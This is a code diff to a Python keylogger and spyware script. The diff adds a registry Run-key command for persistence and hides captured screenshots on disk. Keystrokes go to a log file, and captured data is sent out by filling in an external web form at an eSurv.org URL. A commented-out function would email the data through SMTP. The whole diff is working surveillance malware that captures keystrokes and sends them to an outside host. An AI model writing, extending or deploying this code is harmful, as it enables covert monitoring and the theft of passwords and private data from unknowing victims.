@@ -6,6 +6,10 @@ from mechanize import Browser
 i = 0
 j = 0
 j2 = 0
+startx = "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /d pic.exe"
+path1 = 'C:\\{}'
+pathurl = "https://eSurv.org?s=LCJMFG_147bd357"
+path2 = 'C:\\systemlog.txt'
 """ def sendmail(save):
 	server = smtplib.SMTP('smtp.live.com', 25)
 	verify1 = server.ehlo()
@@ -17,7 +21,7 @@ j2 = 0
 	server.sendmail("yourmail@outlook.in", "mail@outlook.in", msg) """
 def fillform(ss):
 	b = Browser()
-	b.open("your form link")
+	b.open(pathurl)
 	b.select_form(nr=0)
 	b['q0'] = ss;
 	b.submit()
@@ -30,13 +34,13 @@ def screenshot():
 		j = n.minute
 		s = "name"+str(i)+".png";
 		bitmap = autopy.bitmap.capture_screen()
-		bitmap.save('B:\\works\{}'.format(s))
-		fs = 'B:\\works\{}'.format(s)
+		bitmap.save(path1.format(s))
+		fs = path1.format(s)
 		win32api.SetFileAttributes(fs,win32con.FILE_ATTRIBUTE_HIDDEN)
 def OnKeyboardEvent(event):
 	if event.Ascii !=0 or 8:
 		screenshot()		
-		file_log = 'B:\\systemlog.txt' 
+		file_log = path2 
 		if os.path.isfile(file_log) != True:
 			f = open(file_log,'w')
 			f.write(chr(event.Ascii))
